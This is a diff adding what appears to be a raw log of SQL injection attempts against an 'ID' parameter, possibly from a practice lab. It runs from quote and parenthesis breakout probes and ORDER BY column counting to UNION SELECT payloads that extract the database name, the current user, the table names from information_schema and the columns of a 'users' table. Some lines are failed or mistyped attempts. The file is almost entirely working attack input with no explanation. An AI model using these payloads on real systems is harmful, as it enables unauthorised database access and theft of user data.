@@ -1,0 +1,63 @@
+ID:1
+ID:1\
+ID:1
+ID:1'
+ID:1)
+ID:1 and 1=1
+ID:1 and 1=2
+ID:1
+ID:1'
+ID:1)
+ID:1 and 1=1
+ID:1 and 1=2
+ID:1sdasdas
+ID:-1
+ID:1
+ID:1''
+ID:1-- 
+ID:1'
+ID:1'-- 
+ID:1'
+ID:1"
+ID:1"-- 
+ID:1"-- 
+ID:1" -- 
+ID:1"
+ID:"1"
+ID:1"
+ID:1"-- 
+ID:1")
+ID:1")-- 
+ID:1"
+ID:1)
+ID:1“
+ID:1“
+ID:1“
+ID:1)
+ID:1"
+ID:(1"
+ID:1")
+ID:1"
+ID:1"
+ID:(1"
+ID:1
+ID:1”
+ID:1”
+ID:1"
+ID:1")
+ID:1")-- 
+ID:1") order by 1-- 
+ID:1") order by 2-- 
+ID:1") order by 3-- 
+ID:1") order by 4-- 
+ID:1") union select 1,2,3-- 
+ID:-1") union select 1,2,3-- 
+ID:-1") union select 1,database,3-- 
+ID:-1") union select 1,database(),3-- 
+ID:-1") union select 1,database(),user()-- 
+ID:-1") union select 1,group_concat(table_name) from information_schema.tables where table_column=database(),user()-- 
+ID:-1") union select 1,group_concat(table_name) from information_schema.tables where table_column=database()-- ,user()-- 
+ID:-1") union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),user()-- 
+ID:-1") union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- ,user()-- 
+ID:-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- 
+ID:-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'-- 
